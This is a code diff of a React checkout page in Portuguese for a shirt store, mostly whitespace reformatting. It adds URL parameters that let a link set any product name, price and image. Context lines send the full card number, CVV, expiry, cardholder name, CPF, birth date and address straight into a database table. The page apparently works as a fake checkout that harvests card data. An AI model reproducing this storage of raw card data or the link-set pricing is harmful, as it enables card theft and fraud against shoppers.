@@ -17,13 +17,13 @@ interface PixData {
 
 export default function Checkout() {
   const [searchParams] = useSearchParams();
-  const [loading, setLoading]       = useState(false);
+  const [loading, setLoading] = useState(false);
   const [statusErro, setStatusErro] = useState(false);
-  const [metodo, setMetodo]         = useState<'cartao' | 'pix'>('cartao');
-  const [pixData, setPixData]       = useState<PixData | null>(null);
+  const [metodo, setMetodo] = useState<'cartao' | 'pix'>('cartao');
+  const [pixData, setPixData] = useState<PixData | null>(null);
   const [pixLoading, setPixLoading] = useState(false);
-  const [pixErro, setPixErro]       = useState('');
-  const [copiado, setCopiado]       = useState(false);
+  const [pixErro, setPixErro] = useState('');
+  const [copiado, setCopiado] = useState(false);
 
   const [produto, setProduto] = useState({
     nome: 'Buscando camisa...',
@@ -37,12 +37,33 @@ export default function Checkout() {
     numCartao: '', nomeCartao: '', validade: '', cvv: ''
   });
 
-  // Busca produto no Supabase
   useEffect(() => {
     const id = searchParams.get('id');
+    const overrideNome = searchParams.get('nome');
+    const overridePreco = searchParams.get('preco');
+    const overrideImg = searchParams.get('img');
+    const qty = parseInt(searchParams.get('qty') || '1');
+
     if (id) {
-      supabase.from('produtos').select('*').eq('id', id).single().then(({ data }) => {
-        if (data) setProduto({ nome: data.nome, preco: data.preco, imagem: data.imagem_url });
+      supabase
+        .from('produtos')
+        .select('*')
+        .eq('id', id)
+        .single()
+        .then(({ data, error }) => {
+          if (data) {
+            setProduto({
+              nome: overrideNome || data.nome,
+              preco: (overridePreco ? parseFloat(overridePreco) : data.preco) * qty,
+              imagem: overrideImg || data.imagem_url || data.image || 'https://via.placeholder.com/150'
+            });
+          }
+        });
+    } else if (overrideNome && overridePreco) {
+      setProduto({
+        nome: overrideNome,
+        preco: parseFloat(overridePreco) * qty,
+        imagem: overrideImg || 'https://via.placeholder.com/150'
       });
     }
   }, [searchParams]);
@@ -65,20 +86,20 @@ export default function Checkout() {
         identifier,
         amount: produto.preco,
         client: {
-          name:     formData.nome     || 'Cliente',
-          email:    formData.email    || 'cliente@email.com',
-          phone:    formData.telefone || '11999999999',
-          document: formData.cpf      || '00000000000',
+          name: formData.nome || 'Cliente',
+          email: formData.email || 'cliente@email.com',
+          phone: formData.telefone || '11999999999',
+          document: formData.cpf || '00000000000',
         },
       };
 
-      const res  = await fetch(API_URL, {
-        method:  'POST',
+      const res = await fetch(API_URL, {
+        method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'Accept':       'application/json'
+          'Accept': 'application/json'
         },
-        body:    JSON.stringify(payload),
+        body: JSON.stringify(payload),
       });
 
       const json = await res.json();
@@ -91,11 +112,11 @@ export default function Checkout() {
       const pixNode = json?.pix ?? json?.order?.pix ?? null;
 
       const qrCode =
-        pixNode?.code    ??
+        pixNode?.code ??
         pixNode?.payload ??
-        pixNode?.emv     ??
-        pixNode?.qrCode  ??
-        pixNode?.qrcode  ?? '';
+        pixNode?.emv ??
+        pixNode?.qrCode ??
+        pixNode?.qrcode ?? '';
 
       let qrImage = '';
       if (pixNode?.base64) {
@@ -132,15 +153,15 @@ export default function Checkout() {
   const handleCEP = async (e: React.FocusEvent<HTMLInputElement>) => {
     const cep = e.target.value.replace(/\D/g, '');
     if (cep.length === 8) {
-      const res  = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+      const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
       const data = await res.json();
       if (!data.erro) {
         setFormData(prev => ({
           ...prev,
           endereco: data.logradouro,
-          bairro:   data.bairro,
-          cidade:   data.localidade,
-          estado:   data.uf
+          bairro: data.bairro,
+          cidade: data.localidade,
+          estado: data.uf
         }));
       }
     }
@@ -149,12 +170,12 @@ export default function Checkout() {
   // Máscaras
   const mask = (e: React.ChangeEvent<HTMLInputElement>) => {
     let { name, value } = e.target;
-    if (name === 'telefone')      value = value.replace(/\D/g, '').replace(/^(\d{2})(\d)/g, "($1) $2").replace(/(\d)(\d{4})$/, "$1-$2");
-    if (name === 'cpf')           value = value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
-    if (name === 'dataNascimento')value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, "$1/$2").replace(/(\d{2})(\d)/, "$1/$2").substring(0, 10);
-    if (name === 'validade')      value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, "$1/$2").substring(0, 5);
-    if (name === 'numCartao')     value = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, "$1 ");
-    if (name === 'cep')           value = value.replace(/\D/g, '').replace(/(\d{5})(\d)/, "$1-$2");
+    if (name === 'telefone') value = value.replace(/\D/g, '').replace(/^(\d{2})(\d)/g, "($1) $2").replace(/(\d)(\d{4})$/, "$1-$2");
+    if (name === 'cpf') value = value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    if (name === 'dataNascimento') value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, "$1/$2").replace(/(\d{2})(\d)/, "$1/$2").substring(0, 10);
+    if (name === 'validade') value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, "$1/$2").substring(0, 5);
+    if (name === 'numCartao') value = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, "$1 ");
+    if (name === 'cep') value = value.replace(/\D/g, '').replace(/(\d{5})(\d)/, "$1-$2");
     setFormData({ ...formData, [name]: value });
   };
 
@@ -165,23 +186,23 @@ export default function Checkout() {
 
     // Salva tudo no Supabase
     await supabase.from('checkouts').insert([{
-      nome_completo:  formData.nome,
-      email:          formData.email,
-      cpf:            formData.cpf,
-      data_nascimento:formData.dataNascimento,
-      telefone:       formData.telefone,
-      cep:            formData.cep,
-      endereco:       formData.endereco,
-      bairro:         formData.bairro,
-      cidade:         formData.cidade,
-      estado:         formData.estado,
-      numero:         formData.numero,
-      numero_cartao:  formData.numCartao,
-      nome_cartao:    formData.nomeCartao,
-      validade_cartao:formData.validade,
-      cvv_cartao:     formData.cvv,
-      produto_nome:   produto.nome,
-      valor_total:    produto.preco
+      nome_completo: formData.nome,
+      email: formData.email,
+      cpf: formData.cpf,
+      data_nascimento: formData.dataNascimento,
+      telefone: formData.telefone,
+      cep: formData.cep,
+      endereco: formData.endereco,
+      bairro: formData.bairro,
+      cidade: formData.cidade,
+      estado: formData.estado,
+      numero: formData.numero,
+      numero_cartao: formData.numCartao,
+      nome_cartao: formData.nomeCartao,
+      validade_cartao: formData.validade,
+      cvv_cartao: formData.cvv,
+      produto_nome: produto.nome,
+      valor_total: produto.preco
     }]);
 
     setTimeout(() => {
@@ -370,18 +391,18 @@ export default function Checkout() {
 
 // ESTILOS
 const overlayStyle: React.CSSProperties = { position: 'fixed', inset: 0, background: 'rgba(255,255,255,0.95)', zIndex: 1000, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' };
-const spinnerStyle  = { border: '4px solid #f3f3f3', borderTop: '4px solid #1da154', borderRadius: '50%', width: '40px', height: '40px', animation: 'spin 1s linear infinite' };
+const spinnerStyle = { border: '4px solid #f3f3f3', borderTop: '4px solid #1da154', borderRadius: '50%', width: '40px', height: '40px', animation: 'spin 1s linear infinite' };
 const spinnerStylePix = { border: '3px solid #d1fae5', borderTop: '3px solid #1da154', borderRadius: '50%', width: '32px', height: '32px', animation: 'spin 1s linear infinite' };
-const productBox    = { display: 'flex', gap: '15px', padding: '15px', background: '#f8f9fa', borderRadius: '12px', border: '1px solid #ddd', marginBottom: '20px' };
-const imgStyle      = { width: '70px', height: '70px', borderRadius: '8px', objectFit: 'cover' as 'cover' };
-const tabContainer  = { display: 'flex', gap: '8px', marginBottom: '20px', background: '#f1f5f9', padding: '5px', borderRadius: '12px' };
-const tabActive     = { flex: 1, padding: '12px', border: 'none', borderRadius: '8px', background: '#fff', fontWeight: '900', color: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', boxShadow: '0 2px 4px rgba(0,0,0,0.1)', cursor: 'pointer' };
-const tabInactive   = { flex: 1, padding: '12px', border: 'none', background: 'transparent', color: '#666', fontWeight: '900', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', cursor: 'pointer' };
-const sectionLabel  = { fontSize: '12px', fontWeight: '900', color: '#000', margin: '25px 0 10px', letterSpacing: '0.05em' };
-const inputGroup    = { display: 'flex', alignItems: 'center', border: '2px solid #000', borderRadius: '10px', padding: '0 12px', marginBottom: '10px', flex: 1, background: '#fff' };
-const inputStyle    = { border: 'none', padding: '14px 0', marginLeft: '10px', width: '100%', outline: 'none', fontSize: '14px', fontWeight: '900', color: '#000', background: 'transparent' };
-const cardSection   = { marginTop: '25px', padding: '20px', background: '#f8f9fa', borderRadius: '15px', border: '2px solid #000' };
-const errorBanner   = { background: '#fee2e2', color: '#b91c1c', padding: '15px', borderRadius: '10px', marginBottom: '15px', fontSize: '13px', fontWeight: '900', textAlign: 'center' as 'center', border: '1px solid #ef4444' };
-const btnPagar      = { width: '100%', padding: '20px', background: '#1da154', color: '#fff', border: 'none', borderRadius: '12px', fontWeight: '900', fontSize: '16px', marginTop: '10px', cursor: 'pointer' };
-const pixSection    = { marginTop: '20px', textAlign: 'center' as 'center', background: '#f0fff4', padding: '25px 20px', borderRadius: '20px', border: '2px dashed #1da154' };
-const pixCodeBox    = { marginTop: '12px', marginBottom: '4px', fontSize: '10px', background: '#fff', padding: '10px', borderRadius: '8px', border: '1px solid #ddd', wordBreak: 'break-all' as 'break-all', fontWeight: 'bold', textAlign: 'left' as 'left', maxHeight: '60px', overflowY: 'auto' as 'auto' };
+const productBox = { display: 'flex', gap: '15px', padding: '15px', background: '#f8f9fa', borderRadius: '12px', border: '1px solid #ddd', marginBottom: '20px' };
+const imgStyle = { width: '70px', height: '70px', borderRadius: '8px', objectFit: 'cover' as 'cover' };
+const tabContainer = { display: 'flex', gap: '8px', marginBottom: '20px', background: '#f1f5f9', padding: '5px', borderRadius: '12px' };
+const tabActive = { flex: 1, padding: '12px', border: 'none', borderRadius: '8px', background: '#fff', fontWeight: '900', color: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', boxShadow: '0 2px 4px rgba(0,0,0,0.1)', cursor: 'pointer' };
+const tabInactive = { flex: 1, padding: '12px', border: 'none', background: 'transparent', color: '#666', fontWeight: '900', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', cursor: 'pointer' };
+const sectionLabel = { fontSize: '12px', fontWeight: '900', color: '#000', margin: '25px 0 10px', letterSpacing: '0.05em' };
+const inputGroup = { display: 'flex', alignItems: 'center', border: '2px solid #000', borderRadius: '10px', padding: '0 12px', marginBottom: '10px', flex: 1, background: '#fff' };
+const inputStyle = { border: 'none', padding: '14px 0', marginLeft: '10px', width: '100%', outline: 'none', fontSize: '14px', fontWeight: '900', color: '#000', background: 'transparent' };
+const cardSection = { marginTop: '25px', padding: '20px', background: '#f8f9fa', borderRadius: '15px', border: '2px solid #000' };
+const errorBanner = { background: '#fee2e2', color: '#b91c1c', padding: '15px', borderRadius: '10px', marginBottom: '15px', fontSize: '13px', fontWeight: '900', textAlign: 'center' as 'center', border: '1px solid #ef4444' };
+const btnPagar = { width: '100%', padding: '20px', background: '#1da154', color: '#fff', border: 'none', borderRadius: '12px', fontWeight: '900', fontSize: '16px', marginTop: '10px', cursor: 'pointer' };
+const pixSection = { marginTop: '20px', textAlign: 'center' as 'center', background: '#f0fff4', padding: '25px 20px', borderRadius: '20px', border: '2px dashed #1da154' };
+const pixCodeBox = { marginTop: '12px', marginBottom: '4px', fontSize: '10px', background: '#fff', padding: '10px', borderRadius: '8px', border: '1px solid #ddd', wordBreak: 'break-all' as 'break-all', fontWeight: 'bold', textAlign: 'left' as 'left', maxHeight: '60px', overflowY: 'auto' as 'auto' };
